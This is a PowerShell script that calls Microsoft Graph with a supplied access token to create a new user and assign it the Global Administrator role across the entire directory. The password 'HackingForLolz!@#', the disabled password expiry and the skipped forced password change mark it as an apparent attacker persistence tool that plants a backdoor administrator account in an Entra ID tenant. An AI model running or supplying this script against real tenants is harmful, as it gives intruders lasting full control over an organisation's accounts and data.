# Define your Access Token here (ensure it has necessary permissions)
$accessToken = "YOUR_ACCESS_TOKEN"

# Define the username and password for the new user
$userName = "cyberfischer@example.com"
$password = "HackingForLolz!@#"

# Define the new user's properties
$userBody = @{
    "accountEnabled" = $true
    "displayName" = "New Global Admin"
    "mailNickname" = "newuser"
    "userPrincipalName" = $userName
    "passwordProfile" = @{
        "password" = $password
        "forceChangePasswordNextSignIn" = $false
    }
    "passwordPolicies" = "DisablePasswordExpiration"
} | ConvertTo-Json

# Microsoft Graph API endpoint for creating a new user
$graphCreateUserUrl = "https://graph.microsoft.com/v1.0/users"

# Set the HTTP headers including the Authorization with the Bearer token
$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type"  = "application/json"
}

# Create the new user
Write-Host "Creating new user..."
try {
    $userResponse = Invoke-RestMethod -Uri $graphCreateUserUrl -Headers $headers -Method Post -Body $userBody
    $userId = $userResponse.id  # Capture the user Object ID
    Write-Host "User created successfully with ID: $userId"
} catch {
    Write-Host "Failed to create user. Error: " $_.Exception.Message
    return
}

# Role Template ID for Global Administrator
$globalAdminRoleId = "62e90394-69f5-4237-9190-012177145e10"

# Microsoft Graph API endpoint for role assignments
$graphAssignRoleUrl = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments"

# Body for the role assignment request
$roleBody = @{
    "@odata.type" = "#microsoft.graph.unifiedRoleAssignment"
    "principalId" = $userId  # The Object ID of the user
    "roleDefinitionId" = $globalAdminRoleId  # The Role Template ID for Global Admin
    "directoryScopeId" = "/"  # Scope is the entire directory
} | ConvertTo-Json

# Assign the Global Admin role to the new user
Write-Host "Assigning Global Administrator role to the user..."
try {
    $roleResponse = Invoke-RestMethod -Uri $graphAssignRoleUrl -Headers $headers -Method Post -Body $roleBody
    Write-Host "User successfully assigned to Global Administrator role."
} catch {
    Write-Host "Failed to assign Global Administrator role. Error: " $_.Exception.Message
}
